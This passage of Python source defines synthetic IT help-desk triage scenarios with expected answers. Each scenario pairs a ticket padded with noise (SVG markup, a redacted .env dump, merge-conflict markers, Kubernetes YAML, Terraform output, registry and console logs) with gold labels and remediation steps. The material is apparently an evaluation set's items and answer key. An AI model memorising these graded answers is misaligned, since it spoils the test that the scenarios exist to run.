                'stroke="#f44336" stroke-width="2"/>\n'
                '  <text x="650" y="80" text-anchor="middle" font-size="12" '
                'fill="#f44336">Risk Team Area (AFFECTED)</text>\n'
                '  <rect x="50" y="250" width="200" height="150" fill="#e8f5e9" '
                'stroke="#4caf50" stroke-width="1"/>\n'
                '  <text x="150" y="280" text-anchor="middle" font-size="12">'
                "Conference Rooms (OK)</text>\n"
                '  <rect x="300" y="250" width="200" height="150" fill="#fff3e0" '
                'stroke="#ff9800" stroke-width="1"/>\n'
                '  <text x="400" y="280" text-anchor="middle" font-size="12">'
                "Kitchen / Break (Intermittent)</text>\n"
                '  <circle cx="500" cy="450" r="30" fill="#2196f3" opacity="0.7"/>\n'
                '  <text x="500" y="455" text-anchor="middle" font-size="10" '
                'fill="white">AP-7B</text>\n'
                '  <circle cx="200" cy="450" r="30" fill="#2196f3" opacity="0.7"/>\n'
                '  <text x="200" y="455" text-anchor="middle" font-size="10" '
                'fill="white">AP-7A</text>\n'
                '  <line x1="200" y1="450" x2="500" y2="450" stroke="#2196f3" '
                'stroke-width="2" stroke-dasharray="5,5"/>\n'
                '  <text x="350" y="500" text-anchor="middle" font-size="11">'
                "Backbone link between APs</text>\n"
                "</svg>\n\n"
                "As you can see, the affected areas (Trading Desk B and Risk Team) "
                "are both served by access point AP-7B. The areas served by AP-7A "
                "are fine. The drops happen mostly between 9:00-10:30 AM when "
                "trading volume is highest.\n\n"
                "Can you check AP-7B and the uplink to the floor switch?\n\n"
                "Thanks,\nNathan Brooks\nNetwork Engineering"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Ignore the SVG diagram markup and focus on the network issue: "
                "intermittent connectivity drops on Floor 7 Building 2, affecting "
                "~15 users in the AP-7B coverage area during market open hours."
            ),
            remediation_steps=[
                "Check access point AP-7B health, uptime, and error logs on the wireless "
                "controller for the 9:00-10:30 AM window.",
                "Verify the uplink from AP-7B to the floor switch for errors, CRC failures, or bandwidth saturation.",
                "Check AP-7B client density — 15 traders with real-time applications may "
                "exceed the AP's client or throughput capacity.",
                "If AP capacity is the bottleneck, consider adding a second AP to split "
                "the load between Trading Desk B and the Risk Team area.",
                "Monitor the floor for a full trading day after any changes to confirm the drops are resolved.",
            ],
            reporter_name="Nathan Brooks",
            reporter_email="nathan.brooks@contoso.com",
            reporter_department="Network Engineering",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "svg-inline", "xml-noise"],
            difficulty="medium",
        ),
        # ── DC-126  Interleaved / cross-threaded email issues ────────
        ScenarioDefinition(
            scenario_id="DC-126",
            subject="RE: RE: VPN issue / also printer on Floor 3",
            description=(
                "--- Thread participant: Tom Gallagher (tom.gallagher@contoso.com) ---\n\n"
                "Adding to this thread — my VPN has been dropping every 20 minutes "
                "since the maintenance window last Saturday. I get error GP-ERR-4502 "
                "each time. I'm remote, on Comcast residential, using GlobalProtect "
                "6.1.3 on a Dell Latitude 5550 with Windows 11. This is blocking me "
                "from accessing the trade execution platform.\n\n"
                "--- Thread participant: Rebecca Cho (rebecca.cho@contoso.com) ---\n\n"
                "Hi, I know this thread is about VPN but I also wanted to mention "
                "that the printer on Floor 3 (HP LaserJet Pro near the elevator) has "
                "been jammed since yesterday morning. The paper tray light is blinking "
                "red. I cleared the jam once but it happened again immediately. Asset "
                "tag: WM-PRN-0318.\n\n"
                "--- Thread participant: Tom Gallagher ---\n\n"
                "Update on my VPN issue: I tried switching from Wi-Fi to a wired "
                "Ethernet connection and the drops are less frequent but still happen "
                "about every 45 minutes now. The GlobalProtect event log shows "
                "'Tunnel timeout — keepalive missed' right before each drop.\n\n"
                "--- Thread participant: Rebecca Cho ---\n\n"
                "Update on the printer: it's now showing 'Fuser Error' on the LCD "
                "screen. I don't think clearing the jam helped — it might be a "
                "hardware failure. Can someone from Endpoint Engineering take a look?\n\n"
                "--- Thread participant: Tom Gallagher ---\n\n"
                "Just wanted to add — my colleague Raj Patel on the same ISP and "
                "same GlobalProtect version doesn't have this issue, so it might be "
                "specific to my machine or profile.\n\n"
                "Thanks,\nTom Gallagher\nEquity Trading"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.DEVICE_INFO, MissingInfo.NETWORK_LOCATION],
            next_best_action=(
                "This email thread contains TWO separate issues interleaved: (1) Tom's "
                "VPN tunnel drops with GP-ERR-4502 after maintenance, and (2) Rebecca's "
                "printer fuser error on Floor 3. Triage the primary issue — the VPN "
                "drops — and create a separate ticket for the printer."
            ),
            remediation_steps=[
                "Address Tom's VPN issue first: check GlobalProtect gateway logs for "
                "his session around the Saturday maintenance window for configuration changes.",
                "Investigate the 'Tunnel timeout — keepalive missed' errors — check if "
                "MTU or keepalive interval settings were changed during maintenance.",
                "Compare Tom's GlobalProtect client configuration with Raj Patel's to identify differences.",
                "For the printer issue, create a separate ticket and route to Endpoint "
                "Engineering for the HP LaserJet fuser error (WM-PRN-0318).",
                "Follow up with Tom after gateway log analysis to apply targeted fix.",
            ],
            reporter_name="Tom Gallagher",
            reporter_email="tom.gallagher@contoso.com",
            reporter_department="Equity Trading",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "cross-threaded", "interleaved-issues"],
            difficulty="hard",
        ),
        # ── DC-127  Massive CC / BCC recipient list ──────────────────
        ScenarioDefinition(
            scenario_id="DC-127",
            subject="URGENT: Compliance audit scanner failing — all teams alerted",
            description=(
                "To: IT Support <itsupport@contoso.com>\n"
                "CC: john.sterling@contoso.com; maria.vasquez@contoso.com; "
                "chen.wei@contoso.com; sarah.oconnor@contoso.com; "
                "dmitri.volkov@contoso.com; fatima.al-rashid@contoso.com; "
                "james.whitfield@contoso.com; priya.mehta@contoso.com; "
                "robert.nakamura@contoso.com; elena.popov@contoso.com; "
                "marcus.johnson@contoso.com; aisha.ibrahim@contoso.com; "
                "thomas.mueller@contoso.com; li.zhang@contoso.com; "
                "sophia.anderson@contoso.com; kenji.tanaka@contoso.com; "
                "olivia.martinez@contoso.com; benjamin.clark@contoso.com; "
                "nadia.hassan@contoso.com; david.osei@contoso.com; "
                "catherine.dubois@contoso.com; raj.krishnamurthy@contoso.com; "
                "emma.fitzgerald@contoso.com; yuki.watanabe@contoso.com; "
                "michael.oconnell@contoso.com; amara.diallo@contoso.com; "
                "lucas.bergstrom@contoso.com; zara.khan@contoso.com; "
                "peter.novak@contoso.com; jessica.wong@contoso.com; "
                "compliance-all@contoso.com; risk-team@contoso.com; "
                "audit-committee@contoso.com; legal-team@contoso.com; "
                "executive-leadership@contoso.com\n\n"
                "Hi IT team,\n\n"
                "The Contoso Compliance Scanner (CCS) has been failing since this "
                "morning at 6:15 AM. It is unable to complete the daily regulatory "
                "scan across our trading systems. The error in the CCS dashboard "
                "reads: 'Scan aborted — database connection pool exhausted after "
                "retry limit (5/5). Last successful scan: 2026-03-14 06:00:00 UTC.'\n\n"
                "This is critical because we have a FINRA audit review scheduled for "
                "Monday and we need at least 5 consecutive days of clean scan results "
                "to present. If the scanner stays down through the weekend, we will "
                "not meet the audit requirement.\n\n"
                "The CCS connects to the compliance database on ccs-db-prod-01 "
                "(SQL Server 2022). The scanner service runs on ccs-app-prod-01 and "
                "ccs-app-prod-02 behind the internal load balancer.\n\n"
                "Please prioritize this.\n\n"
                "Best regards,\nLaura Chen\nChief Compliance Officer"
            ),
            category=Category.SECURITY,
            priority=Priority.P2,
            team=Team.SECURITY_OPS,
            needs_escalation=True,
            missing_info=[MissingInfo.ERROR_MESSAGE],
            next_best_action=(
                "Ignore the large CC list and focus on the critical issue: the Contoso "
                "Compliance Scanner cannot complete daily regulatory scans due to a "
                "database connection pool exhaustion. This is audit-critical with a "
                "FINRA deadline on Monday."
            ),
            remediation_steps=[
                "Check the SQL Server connection pool on ccs-db-prod-01 — the pool may "
                "be exhausted by leaked connections or a recent configuration change.",
                "Review the CCS application logs on ccs-app-prod-01/02 for connection "
                "leak patterns or increased query volumes.",
                "Restart the CCS application services and monitor connection pool metrics.",
                "If the connection pool limit is too low, increase it after verifying the "
                "SQL Server can handle the additional load.",
                "Run a manual compliance scan after the fix to confirm 5 consecutive "
                "clean results before the Monday FINRA audit.",
            ],
            reporter_name="Laura Chen",
            reporter_email="laura.chen@contoso.com",
            reporter_department="Compliance",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "massive-cc-list", "buried-content"],
            difficulty="medium",
        ),
        # ── DC-128  Environment variable / secrets dump ──────────────
        ScenarioDefinition(
            scenario_id="DC-128",
            subject="Azure deployment pipeline failing — config details below",
            description=(
                "Hi team,\n\n"
                "Our Azure deployment pipeline for the ContosoPayments service has "
                "been failing since yesterday afternoon. I'm sharing the relevant "
                "configuration — I've redacted the actual secret values:\n\n"
                "# .env.staging — ContosoPayments\n"
                "AZURE_SUBSCRIPTION_ID=a1b2c3d4-e5f6-7890-abcd-ef1234567890\n"
                "AZURE_TENANT_ID=f9e8d7c6-b5a4-3210-fedc-ba9876543210\n"
                "AZURE_CLIENT_ID=11111111-2222-3333-4444-555555555555\n"
                "AZURE_CLIENT_SECRET=<REDACTED>\n"
                "AZURE_RESOURCE_GROUP=rg-contoso-payments-staging\n"
                "AZURE_APP_SERVICE_NAME=app-contoso-payments-stg\n"
                "AZURE_KEY_VAULT_NAME=kv-contoso-pay-stg\n"
                "DATABASE_HOST=contoso-pay-db-stg.database.windows.net\n"
                "DATABASE_NAME=contoso_payments_staging\n"
                "DATABASE_USER=app_service_user\n"
                "DATABASE_PASSWORD=<REDACTED>\n"
                "REDIS_HOST=contoso-pay-redis-stg.redis.cache.windows.net\n"
                "REDIS_PORT=6380\n"
                "REDIS_PASSWORD=<REDACTED>\n"
                "APPLICATIONINSIGHTS_CONNECTION_STRING=InstrumentationKey="
                "00000000-0000-0000-0000-000000000000;IngestionEndpoint="
                "https://eastus-0.in.applicationinsights.azure.com/\n"
                "SERVICE_BUS_NAMESPACE=sb-contoso-payments-stg\n"
                "SERVICE_BUS_QUEUE=payment-processing\n"
                "BLOB_STORAGE_ACCOUNT=stcontosopaymentstg\n"
                "BLOB_CONTAINER=payment-receipts\n"
                "LOG_LEVEL=DEBUG\n"
                "FEATURE_FLAG_NEW_CHECKOUT=true\n"
                "MAX_RETRY_COUNT=3\n"
                "TIMEOUT_SECONDS=30\n\n"
                "The pipeline fails at the 'Deploy to App Service' step with:\n"
                "'ERROR: The deployment slot staging is in a failed state. "
                "Provisioning state: Failed. Details: Cannot allocate managed "
                "identity for the app service.'\n\n"
                "We need this fixed before end of day — the payments team is waiting "
                "to test the new checkout flow in staging.\n\n"
                "Thanks,\nOmar Farouk\nBackend Engineering"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Ignore the .env configuration dump (secrets are redacted) and focus "
                "on the Azure deployment failure: managed identity allocation is failing "
                "for the staging App Service deployment slot."
            ),
            remediation_steps=[
                "Check the Azure App Service staging slot status and its managed identity "
                "configuration in the Azure portal.",
                "Verify the managed identity is enabled and has the correct role assignments "
                "on the resource group rg-contoso-payments-staging.",
                "If the managed identity is in a failed state, delete and recreate it via 'az webapp identity assign'.",
                "Check if the Azure subscription has hit any managed identity limits.",
                "Re-run the deployment pipeline after fixing the managed identity and verify "
                "the staging slot provisions successfully.",
            ],
            reporter_name="Omar Farouk",
            reporter_email="omar.farouk@contoso.com",
            reporter_department="Backend Engineering",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "env-var-dump", "config-noise"],
            difficulty="medium",
        ),
        # ── DC-129  Git diff / merge conflict markers ────────────────
        ScenarioDefinition(
            scenario_id="DC-129",
            subject="CI/CD pipeline broken after branch merge — conflict markers in config",
            description=(
                "Hi team,\n\n"
                "Our CI/CD pipeline for the ContosoRisk service has been failing since "
                "a bad merge this morning. The build step fails because there are merge "
                "conflict markers left in the configuration file. Here's what the "
                "pipeline shows:\n\n"
                "```\n"
                "Step 4/12: Validate configuration\n"
                "ERROR: Parse error in config/appsettings.Production.json at line 47\n"
                "--- begin file excerpt ---\n"
                '  "ConnectionStrings": {\n'
                "<<<<<<< HEAD\n"
                '    "RiskDatabase": "Server=risk-db-prod-01.database.windows.net;'
                'Database=contoso_risk;Encrypt=true;TrustServerCertificate=false;",\n'
                '    "CacheConnection": "contoso-risk-redis.redis.cache.windows.net:6380,'
                'password=****,ssl=True,abortConnect=False"\n'
                "=======\n"
                '    "RiskDatabase": "Server=risk-db-prod-02.database.windows.net;'
                'Database=contoso_risk_v2;Encrypt=true;TrustServerCertificate=false;",\n'
                '    "CacheConnection": "contoso-risk-redis-v2.redis.cache.windows.net:6380,'
                'password=****,ssl=True,abortConnect=False"\n'
                ">>>>>>> feature/risk-engine-v2\n"
                "  },\n"
                '  "Logging": {\n'
                "<<<<<<< HEAD\n"
                '    "LogLevel": {\n'
                '      "Default": "Warning",\n'
                '      "Microsoft": "Warning"\n'
                "    }\n"
                "=======\n"
                '    "LogLevel": {\n'
                '      "Default": "Information",\n'
                '      "Microsoft": "Warning",\n'
                '      "ContosoRisk.Engine": "Debug"\n'
                "    }\n"
                ">>>>>>> feature/risk-engine-v2\n"
                "  }\n"
                "--- end file excerpt ---\n"
                "```\n\n"
                "The merge was between `main` and `feature/risk-engine-v2`. It looks "
                "like someone resolved the merge on GitHub but missed these conflict "
                "markers in the config file. The pipeline has been red for 4 hours now "
                "and the risk engine team can't deploy their hotfix.\n\n"
                "Can someone help resolve the merge conflicts and get the pipeline "
                "green again?\n\n"
                "Thanks,\nAlex Rivera\nDevOps"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.AFFECTED_USERS],
            next_best_action=(
                "Ignore the git merge conflict markers in the description and focus on "
                "the issue: unresolved merge conflicts in config/appsettings.Production.json "
                "are breaking the ContosoRisk CI/CD pipeline."
            ),
            remediation_steps=[
                "Resolve the merge conflict markers in config/appsettings.Production.json — "
                "coordinate with the risk engine team on which connection strings to keep.",
                "Verify no other files in the repository contain unresolved conflict markers "
                "by running 'git diff --check' or searching for '<<<<<<<'.",
                "Commit the resolved configuration and push to trigger the pipeline.",
                "Monitor the pipeline run to confirm all 12 steps pass successfully.",
                "Add a pre-commit hook or CI check that rejects files containing merge "
                "conflict markers to prevent this in the future.",
            ],
            reporter_name="Alex Rivera",
            reporter_email="alex.rivera@contoso.com",
            reporter_department="DevOps",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "git-diff-noise", "merge-conflicts"],
            difficulty="medium",
        ),
        # ── DC-130  YAML / TOML configuration dump ───────────────────
        ScenarioDefinition(
            scenario_id="DC-130",
            subject="Kubernetes pod crash loop — deployment config attached",
            description=(
                "Hi team,\n\n"
                "The ContosoSettlement service pods have been in CrashLoopBackOff "
                "since 5:30 AM this morning. Here's the deployment YAML for reference:\n\n"
                "apiVersion: apps/v1\n"
                "kind: Deployment\n"
                "metadata:\n"
                "  name: contoso-settlement\n"
                "  namespace: production\n"
                "  labels:\n"
                "    app: contoso-settlement\n"
                "    team: settlements\n"
                "    version: v3.2.1\n"
                "spec:\n"
                "  replicas: 3\n"
                "  selector:\n"
                "    matchLabels:\n"
                "      app: contoso-settlement\n"
                "  template:\n"
                "    metadata:\n"
                "      labels:\n"
                "        app: contoso-settlement\n"
                "    spec:\n"
                "      containers:\n"
                "      - name: settlement-api\n"
                "        image: contoso.azurecr.io/settlement-api:v3.2.1\n"
                "        ports:\n"
                "        - containerPort: 8080\n"
                "        resources:\n"
                "          requests:\n"
                "            memory: '512Mi'\n"
                "            cpu: '250m'\n"
                "          limits:\n"
                "            memory: '1Gi'\n"
                "            cpu: '500m'\n"
                "        env:\n"
                "        - name: DB_HOST\n"
                "          valueFrom:\n"
                "            secretKeyRef:\n"
                "              name: settlement-db-secret\n"
                "              key: host\n"
                "        - name: DB_PASSWORD\n"
                "          valueFrom:\n"
                "            secretKeyRef:\n"
                "              name: settlement-db-secret\n"
                "              key: password\n"
                "        livenessProbe:\n"
                "          httpGet:\n"
                "            path: /health\n"
                "            port: 8080\n"
                "          initialDelaySeconds: 15\n"
                "          periodSeconds: 10\n"
                "        readinessProbe:\n"
                "          httpGet:\n"
                "            path: /ready\n"
                "            port: 8080\n"
                "          initialDelaySeconds: 5\n"
                "          periodSeconds: 5\n\n"
                "The pod logs show:\n"
                "'FATAL: Could not connect to database at settlement-db-secret:host. "
                "Error: ECONNREFUSED 10.0.4.52:5432. Retries exhausted (5/5). Exiting.'\n\n"
                "The database was migrated to a new IP on Friday (10.0.4.80) but the "
                "Kubernetes secret still points to the old IP. Can you update the secret "
                "and restart the pods?\n\n"
                "Thanks,\nHenry Park\nSettlements"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS],
            next_best_action=(
                "Ignore the YAML configuration dump and focus on the root cause: the "
                "Kubernetes secret 'settlement-db-secret' still has the old database "
                "IP (10.0.4.52) after Friday's migration to 10.0.4.80."
            ),
            remediation_steps=[
                "Update the Kubernetes secret 'settlement-db-secret' with the new database "
                "IP (10.0.4.80) using 'kubectl edit secret' or a sealed-secret update.",
                "Restart the contoso-settlement pods with 'kubectl rollout restart deployment "
                "contoso-settlement -n production'.",
                "Verify the pods transition from CrashLoopBackOff to Running status.",
                "Check the pod logs to confirm successful database connectivity after restart.",
                "Update the infrastructure documentation to reflect the new database IP and "
                "ensure the CI/CD pipeline's secret management is updated for future deploys.",
            ],
            reporter_name="Henry Park",
            reporter_email="henry.park@contoso.com",
            reporter_department="Settlements",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "yaml-config-dump", "kubernetes"],
            difficulty="medium",
        ),
        # ── DC-131  Terraform plan output pasted inline ────────────────
        ScenarioDefinition(
            scenario_id="DC-131",
            subject="Azure deployment failing — terraform plan output attached",
            description=(
                "Hi IT,\n\n"
                "Our Azure deployment keeps failing. I ran terraform plan and here's "
                "the output:\n\n"
                "Terraform will perform the following actions:\n\n"
                "  # azurerm_linux_virtual_machine.trading_api will be created\n"
                '  + resource "azurerm_linux_virtual_machine" "trading_api" {\n'
                '      + admin_username                  = "azureuser"\n'
                "      + allow_extension_operations      = true\n"
                "      + computer_name                   = (known after apply)\n"
                "      + disable_password_authentication = true\n"
                '      + extensions_time_budget           = "PT1H30M"\n'
                "      + id                              = (known after apply)\n"
                '      + location                        = "eastus2"\n'
                "      + max_bid_price                   = -1\n"
                '      + name                            = "vm-trading-api-prod-001"\n'
                "      + network_interface_ids            = (known after apply)\n"
                '      + patch_assessment_mode            = "ImageDefault"\n'
                '      + patch_mode                       = "ImageDefault"\n'
                "      + platform_fault_domain            = -1\n"
                '      + priority                         = "Regular"\n'
                "      + private_ip_address               = (known after apply)\n"
                "      + provision_vm_agent               = true\n"
                "      + public_ip_address                = (known after apply)\n"
                '      + resource_group_name              = "rg-trading-prod-eastus2"\n'
                '      + size                             = "Standard_D4s_v5"\n'
                "      + virtual_machine_id               = (known after apply)\n"
                "      + os_disk {\n"
                '          + caching              = "ReadWrite"\n'
                '          + storage_account_type = "Premium_LRS"\n'
                "          + disk_size_gb         = 128\n"
                "        }\n"
                "    }\n\n"
                "  # azurerm_network_security_group.trading_nsg will be updated in-place\n"
                '  ~ resource "azurerm_network_security_group" "trading_nsg" {\n'
                '        id   = "/subscriptions/a1b2c3d4/resourceGroups/rg-trading-prod"\n'
                "      ~ tags = {\n"
                '          + "environment" = "production"\n'
                "        }\n"
                "    }\n\n"
                "  # azurerm_subnet.trading_subnet will be destroyed\n"
                '  - resource "azurerm_subnet" "old_trading_subnet" {\n'
                '      - address_prefixes = ["10.0.1.0/24"] -> null\n'
                '      - id              = "/subscriptions/a1b2c3d4/..." -> null\n'
                "    }\n\n"
                "Plan: 1 to add, 1 to change, 1 to destroy.\n\n"
                "When I run terraform apply it fails with:\n"
                "Error: creating Linux Virtual Machine: compute.VirtualMachinesClient#CreateOrUpdate: "
                'Failure sending request: StatusCode=409 -- Original Error: Code="OperationNotAllowed" '
                'Message="Operation could not be completed as it results in exceeding approved '
                'Total Regional Cores quota."\n\n'
                "We need the core quota increased for eastus2 or we need to resize the VM. "
                "Can you help?\n\n"
                "Thanks,\nDaniel Osei\nCloud Infrastructure"
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ENVIRONMENT_DETAILS, MissingInfo.BUSINESS_IMPACT],
            next_best_action=(
                "Ignore the terraform plan output noise and focus on the root cause: "
                "Azure regional vCPU quota exceeded in eastus2 when trying to create a "
                "Standard_D4s_v5 VM for the trading API."
            ),
            remediation_steps=[
                "Check the current vCPU quota utilization for the eastus2 region in the subscription.",
                "Submit an Azure support request to increase the Dv5 family quota in eastus2.",
                "Alternatively, consider deploying in a different region with available quota.",
                "If urgent, resize the VM to a smaller SKU (e.g., Standard_D2s_v5) as a temporary measure.",
                "Review and clean up unused VMs in the subscription to free up quota headroom.",
            ],
            reporter_name="Daniel Osei",
            reporter_email="daniel.osei@contoso.com",
            reporter_department="Cloud Infrastructure",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "terraform-output", "infrastructure-as-code"],
            difficulty="hard",
        ),
        # ── DC-132  Windows Registry export pasted inline ──────────────
        ScenarioDefinition(
            scenario_id="DC-132",
            subject="Network adapter keeps losing IP after reboot — registry dump",
            description=(
                "My network adapter keeps losing its static IP configuration every time "
                "I reboot. I exported the relevant registry keys, maybe this helps:\n\n"
                "Windows Registry Editor Version 5.00\n\n"
                "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services"
                "\\Tcpip\\Parameters\\Interfaces"
                "\\{A1B2C3D4-E5F6-7890-ABCD-EF1234567890}]\n"
                '"EnableDHCP"=dword:00000000\n'
                '"IPAddress"=hex(7):31,00,30,00,2e,00,30,00,2e,00,34,00,2e,00,'
                "31,00,35,00,00,00,00,00\n"
                '"SubnetMask"=hex(7):32,00,35,00,35,00,2e,00,32,00,35,00,35,00,'
                "2e,00,32,00,35,00,35,00,2e,00,30,00,00,00,00,00\n"
                '"DefaultGateway"=hex(7):31,00,30,00,2e,00,30,00,2e,00,34,00,'
                "2e,00,31,00,00,00,00,00\n"
                '"NameServer"="10.0.4.10,10.0.4.11"\n'
                '"Domain"="contoso.local"\n'
                '"RegistrationEnabled"=dword:00000001\n'
                '"RegisterAdapterName"=dword:00000000\n\n'
                "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services"
                "\\Tcpip\\Parameters]\n"
                '"Hostname"="WKSTN-FI-3421"\n'
                '"Domain"="contoso.local"\n'
                '"SearchList"="contoso.local,contoso.com"\n'
                '"UseDomainNameDevolution"=dword:00000001\n'
                '"EnableICMPRedirect"=dword:00000001\n'
                '"DeadGWDetectDefault"=dword:00000001\n'
                '"DontAddDefaultGatewayDefault"=dword:00000000\n\n'
                "[HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services"
                "\\NDIS\\Parameters]\n"
                '"TraceLevel"=dword:00000001\n\n'
                "The static IP is 10.0.4.15 but after reboot it falls back to DHCP "
                "and gets 10.0.4.107 instead. This breaks my mapped drives and the "
                "Bloomberg terminal connection.\n\n"
                "Workstation: WKSTN-FI-3421, Windows 11 Enterprise 23H2\n"
                "Adapter: Intel I225-V 2.5G Ethernet"
            ),
            category=Category.NETWORK,
            priority=Priority.P2,
            team=Team.NETWORK_OPS,
            needs_escalation=False,
            missing_info=[MissingInfo.STEPS_TO_REPRODUCE],
            next_best_action=(
                "Ignore the registry dump noise and focus on the core issue: the static "
                "IP configuration (10.0.4.15) is not persisting across reboots on "
                "WKSTN-FI-3421, reverting to DHCP each time."
            ),
            remediation_steps=[
                "Check if a Group Policy or Intune policy is overriding the static IP with DHCP on reboot.",
                "Verify the network adapter driver is up to date for the Intel I225-V.",
                "Reconfigure the static IP via the Network Connections GUI rather than registry to ensure"
                " proper persistence.",
                "Check for conflicting DHCP reservations on the DHCP server for this MAC address.",
                "Test whether the issue persists after disabling the DHCP Client service.",
            ],
            reporter_name="Tomoko Hayashi",
            reporter_email="tomoko.hayashi@contoso.com",
            reporter_department="Fixed Income",
            channel=Channel.EMAIL,
            tags=["data-cleanup", "registry-dump", "windows-registry"],
            difficulty="hard",
        ),
        # ── DC-133  Browser DevTools console errors pasted ─────────────
        ScenarioDefinition(
            scenario_id="DC-133",
            subject="Internal portal SSO login broken — browser console errors",
            description=(
                "I can't log into the internal risk portal (risk.contoso.com). I opened "
                "the browser DevTools and copied the console output:\n\n"
                "[09:14:32.441] Navigating to https://risk.contoso.com/auth/login\n"
                "[09:14:33.102] GET https://login.microsoftonline.com/a1b2c3d4-e5f6-..."
                " 302 Redirect\n"
                "[09:14:33.558] GET https://risk.contoso.com/auth/callback?code=0.AXEA..."
                " 500 Internal Server Error\n"
                "[09:14:33.560] Error: Failed to fetch user profile\n"
                "    at AuthModule.handleCallback (auth.bundle.js:1:24521)\n"
                "    at async Router.processRoute (router.bundle.js:1:8847)\n"
                "    at async App.initialize (app.bundle.js:1:3392)\n"
                "[09:14:33.562] Uncaught (in promise) TypeError: Cannot read properties "
                "of undefined (reading 'displayName')\n"
                "    at UserContext.setUser (user-context.js:1:1205)\n"
                "    at AuthModule.completeLogin (auth.bundle.js:1:24890)\n"
                "[09:14:33.890] Mixed Content: The page at 'https://risk.contoso.com' "
                "was loaded over HTTPS but requested 'http://api.contoso.com/v2/user/"
                "profile' (insecure resource).\n"
                "[09:14:34.001] Access to XMLHttpRequest at 'https://api.contoso.com/"
                "v2/user/profile' from origin 'https://risk.contoso.com' has been "
                "blocked by CORS policy: No 'Access-Control-Allow-Origin' header.\n"
                "[09:14:34.250] POST https://telemetry.contoso.com/collect 200 OK\n"
                "[09:14:34.500] WebSocket connection to 'wss://risk.contoso.com/ws' "
                "failed: Error during WebSocket handshake: net::ERR_CONNECTION_REFUSED\n\n"
                "The login starts but then the callback fails. Other people on my team "
                "can log in fine. This started after I was moved to the new Entra ID "
                "group last week.\n\n"
                "Browser: Edge 122.0.2365.80, Windows 11"
            ),
            category=Category.ACCESS_AUTH,
            priority=Priority.P2,
            team=Team.IAM,
            needs_escalation=False,
            missing_info=[MissingInfo.AUTHENTICATION_METHOD, MissingInfo.AFFECTED_SYSTEM],
            next_best_action=(
                "Ignore the verbose browser console output and focus on the root cause: "
                "the auth callback returns 500 after the user was moved to a new Entra ID "
                "group, suggesting a group-based conditional access or app role assignment issue."
            ),
            remediation_steps=[
                "Verify the user's Entra ID group membership includes the required app role for risk.contoso.com.",
                "Check the enterprise application's user/group assignment in Entra ID.",
                "Review conditional access policies that may block the new group.",
                "Check the backend auth callback logs for the 500 error details.",
                "If CORS errors appear, verify the API backend configuration allows the portal origin.",
            ],
            reporter_name="Ravi Krishnamurthy",
            reporter_email="ravi.krishnamurthy@contoso.com",
            reporter_department="Risk Management",
            channel=Channel.PORTAL,
            tags=["data-cleanup", "browser-devtools", "console-errors"],
            difficulty="hard",
        ),
        # ── DC-134  Azure CLI JSON output pasted ───────────────────────
        ScenarioDefinition(
            scenario_id="DC-134",
            subject="Azure VM not reachable — az vm show output",
            description=(
                "My Azure VM stopped responding. I ran az vm show and got:\n\n"
                "{\n"
                '  "id": "/subscriptions/a1b2c3d4-e5f6-7890/resourceGroups/'
                "rg-analytics-prod/providers/Microsoft.Compute/virtualMachines/"
                'vm-analytics-01",\n'
                '  "location": "eastus",\n'
                '  "name": "vm-analytics-01",\n'
                '  "hardwareProfile": { "vmSize": "Standard_E8s_v5" },\n'
                '  "storageProfile": {\n'
                '    "osDisk": {\n'
                '      "osType": "Linux",\n'
                '      "name": "osdisk-analytics-01",\n'
                '      "diskSizeGb": 128,\n'
                '      "managedDisk": { "storageAccountType": "Premium_LRS" }\n'
                "    },\n"
                '    "dataDisks": [{\n'
                '      "lun": 0,\n'
                '      "name": "datadisk-analytics-01",\n'
                '      "diskSizeGb": 1024,\n'
                '      "managedDisk": { "storageAccountType": "Premium_LRS" }\n'
                "    }]\n"
                "  },\n"
                '  "osProfile": {\n'
                '    "computerName": "vm-analytics-01",\n'
                '    "adminUsername": "azureadmin"\n'
                "  },\n"
                '  "networkProfile": {\n'
                '    "networkInterfaces": [{\n'
                '      "id": "/subscriptions/a1b2c3d4/.../nic-analytics-01"\n'
                "    }]\n"
                "  },\n"
                '  "provisioningState": "Succeeded",\n'
                '  "instanceView": {\n'
                '    "statuses": [{\n'
                '      "code": "PowerState/stopped",\n'
                '      "displayStatus": "VM stopped"\n'
                "    }]\n"
                "  }\n"
                "}\n\n"
                "I can't SSH into it and I need it for the quarterly analytics run "
                "which starts tomorrow. Please start the VM and check why it stopped."
            ),
            category=Category.SOFTWARE,
            priority=Priority.P2,
            team=Team.ENTERPRISE_APPS,
            needs_escalation=False,
            missing_info=[MissingInfo.ERROR_MESSAGE, MissingInfo.TIMESTAMP],
            next_best_action=(
                "Ignore the verbose az vm show JSON dump and focus on the issue: "
                "VM vm-analytics-01 is in PowerState/stopped and needs to be started "
                "before the quarterly analytics run tomorrow."
            ),
            remediation_steps=[
                "Start the VM using 'az vm start -g rg-analytics-prod -n vm-analytics-01'.",
                "Check Azure Activity Log to determine why the VM was stopped"
                " (auto-shutdown policy, billing, or manual action).",
                "Verify SSH connectivity once the VM is running.",
                "Check if an auto-shutdown schedule is configured that needs adjustment.",
                "Consider setting up Azure alerts for unexpected VM deallocations.",
            ],
